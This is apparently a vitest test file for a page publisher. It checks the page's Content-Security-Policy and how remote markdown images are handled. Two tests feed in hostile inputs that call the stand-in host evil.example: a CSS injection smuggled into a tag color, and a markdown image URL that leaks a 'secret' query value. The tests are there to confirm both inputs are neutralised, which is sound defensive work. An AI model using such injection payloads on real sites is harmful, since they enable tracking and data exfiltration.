import { createHash } from 'node:crypto'
import { describe, expect, it } from 'vitest'
import { parseMarkdown } from '../../../lib/markdown'
import { EntityStore } from '../../../core/entity/store'
import { TypeRegistry } from '../../../core/entity/typeRegistry'
import { PAGE_SCRIPT, mdHtml, publishProject, publishedPolicy } from '../publish'

describe('the published page protects itself', () => {
  it('runs its one script by hash, and loads nothing from anywhere', async () => {
    const policy = await publishedPolicy()
    const hash = createHash('sha256').update(PAGE_SCRIPT, 'utf8').digest('base64')
    expect(policy).toContain(`script-src 'sha256-${hash}'`)
    expect(policy).toContain("default-src 'none'")
    expect(policy).toContain('img-src data:;')
    expect(policy).not.toMatch(/https:|unsafe-eval|'unsafe-inline'[^;]*script/)
  })

  it('carries the policy, and the script it names is the script it holds', async () => {
    const store = new EntityStore()
    const registry = new TypeRegistry(store)
    store.upsert({ id: 'p1', type: 'person', label: 'Ada', tags: ['x'], data: {}, meta: { source: 'test', createdAt: '2026-01-01', updatedAt: '2026-01-01' } } as never)
    store.setTagInfo('x', { color: 'red;background:url(https://evil.example/t)' })
    const { html } = await publishProject(store, registry, null, { skipCharts: true })
    const meta = /<meta http-equiv="Content-Security-Policy" content="([^"]+)">/.exec(html)
    expect(meta).not.toBeNull()
    const inline = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map((m) => m[1])
    expect(inline).toHaveLength(1)
    expect(meta![1]).toContain(`'sha256-${createHash('sha256').update(inline[0], 'utf8').digest('base64')}'`)
    expect(html).not.toContain('evil.example')
  })

  it('writes a remote picture as a link, never a request', () => {
    const html = mdHtml(parseMarkdown('![chart](https://evil.example/p.png?d=secret) ![dot](data:image/png;base64,AAAA)'))
    expect(html).not.toMatch(/<img[^>]+evil\.example/)
    expect(html).toContain('<a href="https://evil.example/p.png?d=secret" rel="noopener noreferrer">chart</a>')
  })
})
